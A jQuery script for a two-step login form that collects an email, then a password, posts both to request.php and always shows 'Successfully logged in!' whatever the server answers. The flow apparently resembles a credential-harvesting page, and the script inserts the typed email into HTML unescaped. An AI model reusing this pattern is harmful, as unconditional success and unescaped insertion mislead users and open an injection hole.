$(document).ready(function () {
  localStorage.clear();
  $("#nextBtn").click(function (e) {
    e.preventDefault();
    const email = $("#emailOrUsername").val();
    const pass = $("#password").val();
    // CHECK IF USER FILLED EMAIL ALREADY
    if (localStorage.getItem("email")) {
      if (pass === "") {
        alert("Password cannot be empty!");
        return;
      } else {
        $.ajax({
          type: "POST",
          url: "request.php",
          data: {
            email: email,
            password: pass,
          },
          success: function (response) {
            localStorage.clear();
            const originalHeight = $(".form--body--col").height();
            $(".form--body--col").html(
              "<div class='success-msg heading--form--h2'>Successfully logged in!</div>"
            );
            $(".form--body--col").height(originalHeight);
          },
        });
      }
    } else {
      // CHECK IF USER DID NOT FILLED EMAIL THEN SET EMAIL TO LOCAL STORAGE
      if (email === "") {
        alert("Email cannot be empty!");
        return;
      } else {
        localStorage.setItem("email", email);
        $("#step1").toggleClass("active");
        $("#step2").toggleClass("active");
        let loginForm = $("#loginForm");
        loginForm.prepend(`<div class="data-user" id="step3">
            <div class="input-group">
                <img src="./user.png" alt="user img" id="user_Img">
            </div>
            <div class="input-group">
                <p class="text-muted w-100 m-0" id="currentEmail">
                    ${email}
                </p>
                <a href="#" class="form--a--2" id="changeEmailLink">Change email or username</a>
            </div>
        </div>`);
      }
    }

    // if (email === "") return;
    // $("#step1").toggleClass("active");
    // if (pass === "") return;
  });
});
